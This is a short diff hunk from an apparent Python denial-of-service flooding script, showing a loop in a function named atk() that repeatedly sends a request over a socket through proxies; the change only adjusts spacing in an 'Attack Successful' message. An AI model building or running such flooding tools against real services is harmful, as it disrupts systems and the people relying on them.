@@ -222,7 +222,7 @@ def atk():
 			try:
 				for y in range(per):
 					s.send(str.encode(request))
-				print("[+] AsparTim Attack Successful ["+ str(proxy[0])+":"+str(proxy[1]) +"]")
+				print("[+] AsparTim Attack Successful [ "+ str(proxy[0])+":"+str(proxy[1]) +"] ")
 			except:
 				s.close()
 		except:
